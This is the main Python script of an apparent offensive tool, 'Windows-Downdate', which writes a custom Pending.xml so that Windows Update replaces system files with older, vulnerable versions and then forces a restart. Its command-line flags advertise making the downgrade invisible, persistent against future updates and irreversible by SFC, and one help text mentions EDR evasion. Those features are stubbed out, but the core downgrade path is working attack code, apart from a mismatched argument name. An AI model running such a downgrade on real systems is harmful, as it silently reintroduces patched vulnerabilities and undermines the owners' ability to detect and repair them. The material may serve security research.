import argparse
import logging
import sys
from typing import List

from windows_downdate.component_store_utils import retrieve_oldest_files_for_update_files
from windows_downdate.filesystem_utils import is_path_exists, Path, is_file_contents_equal
from windows_downdate.system_utils import restart_system
from windows_downdate.update_file import UpdateFile
from windows_downdate.update_utils import pend_update, get_empty_pending_xml
from windows_downdate.xml_utils import load_xml, find_child_elements_by_match, get_element_attribute, create_element, \
    append_child_element, ET


logger = logging.getLogger(__name__)


DOWNGRADE_XML_PATH = "resources\\Downgrade.xml"


# TODO: Add logs


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Windows-Downdate: Craft any customized Windows Update")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--config-xml", type=str, help="Path to the Config.xml file.")
    group.add_argument("--custom-pending-xml", type=str, help="Path to the custom, finalized Pending.xml file.")
    parser.add_argument("--force-restart", action="store_true", required="--restart-timeout" in sys.argv,
                        help="Flag specifying whether to force an automatic machine restart. "
                             "Update takes place during the restart.")
    parser.add_argument("--restart-timeout", type=int, default=10,
                        help="How much time to wait until the automatic machine restart.")
    parser.add_argument("--elevate", action="store_true",
                        help="Flag specifying whether to elevate to TrustedInstaller. "
                             "Functionality is the same, but smoother with TrustedInstaller. "
                             "Not recommended if facing an EDR!")
    parser.add_argument("--invisible", action="store_true",
                        help="Flag specifying whether to make the downgrade invisible by installing missing updates. "
                             "If not used, and the system has missing updates, the system may not be fully up to date.")
    parser.add_argument("--persistent", action="store_true",
                        help="Flag specifying whether to employ downgrade persistence by emptying future updates. "
                             "If not used, future updates may overwrite the downgrade.")
    parser.add_argument("--irreversible", action="store_true",
                        help="Flag specifying whether to make the downgrade irreversible. "
                             "If not used, repairing tools such as SFC may be able to detect and repair the downgrade.")

    return parser.parse_args()


def init_logger() -> None:
    logger.setLevel(logging.INFO)
    stream_handler = logging.StreamHandler()
    log_format = logging.Formatter('[%(levelname)s] %(message)s')
    stream_handler.setFormatter(log_format)
    logger.addHandler(stream_handler)


def parse_config_xml(config_file_path: str) -> List[UpdateFile]:

    config_xml = load_xml(config_file_path)

    update_files = []
    for update_file in find_child_elements_by_match(config_xml, "./UpdateFilesList/UpdateFile"):
        destination_file = get_element_attribute(update_file, "destination")
        destination_file_obj = Path(destination_file)

        # If the destination does not exist, we can not update it
        if not is_path_exists(destination_file_obj.full_path):
            raise FileNotFoundError(f"The file to update {destination_file_obj.full_path} does not exist")

        source_file = get_element_attribute(update_file, "source")
        source_file_obj = Path(source_file)

        # If the source does not exist, retrieve its oldest version from the component store
        if not is_path_exists(source_file_obj.full_path):
            should_retrieve_oldest = True
        else:
            should_retrieve_oldest = False

        update_file_obj = UpdateFile(source_file_obj, destination_file_obj, should_retrieve_oldest, False)
        update_files.append(update_file_obj)

    return update_files


def craft_downgrade_xml(update_files: List[UpdateFile]) -> ET.ElementTree:
    downgrade_xml = get_empty_pending_xml()
    poq_element = find_child_elements_by_match(downgrade_xml, "./POQ")[0]  # Post reboot POQ is always at index 0

    for update_file in update_files:

        # Let's make sure we do not update files that are the same
        if is_file_contents_equal(update_file.source.full_path, update_file.destination.full_path):
            logger.info(f"Skipping update of {update_file.destination.name}, source and destination are the same")
            continue

        hardlink_dict = update_file.to_hardlink_dict()
        hardlink_element = create_element("HardlinkFile", hardlink_dict)
        append_child_element(poq_element, hardlink_element)

    return downgrade_xml


def main() -> None:
    init_logger()
    args = parse_args()

    if args.config_file:
        if not is_path_exists(args.config_file):
            raise Exception("Config.xml file does not exist")

        downgrade_xml_path = DOWNGRADE_XML_PATH
        update_files = parse_config_xml(args.config_file)
        retrieve_oldest_files_for_update_files(update_files)
        downgrade_xml = craft_downgrade_xml(update_files)
        downgrade_xml.write(downgrade_xml_path)

    else:
        if not is_path_exists(args.custom_pending_xml):
            raise Exception("Custom Pending.xml file does not exist")

        downgrade_xml_path = args.custom_pending_xml

    # Install all missing Windows Updates to make the system "Up to date"
    if args.invisible:
        raise NotImplementedError("Not implemented yet")

    # Add poqexec.exe patch to downgrade XML
    if args.persistent:
        raise NotImplementedError("Not implemented yet")

    # Add SFC.exe patch to downgrade XML
    if args.irreversible:
        raise NotImplementedError("Not implemented yet")

    # Elevate to TrustedInstaller
    if args.elevate:
        raise NotImplementedError("Not implemented yet")

    pend_update(downgrade_xml_path)

    if args.force_restart:
        restart_system(args.restart_timeout)


if __name__ == '__main__':
    main()
